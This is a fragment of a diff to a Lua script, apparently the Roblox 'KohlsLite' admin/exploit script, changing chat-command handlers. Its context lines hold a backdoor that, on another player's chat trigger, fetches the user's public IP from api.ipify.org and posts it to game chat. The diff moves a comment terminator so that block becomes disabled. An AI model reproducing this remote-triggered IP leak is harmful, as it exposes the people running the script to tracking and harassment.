@@ -8350,13 +8350,11 @@ v.Chatted:Connect(function(msg)
                                 pcall(function()
                                 	game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
                                 end)
-                end
-
-                end
+                end ]]
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                     Remind("You have been warned by a KohlsLite collaborator!")
-                end ]]
+                end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                                     Remind("You have been WARNED!")
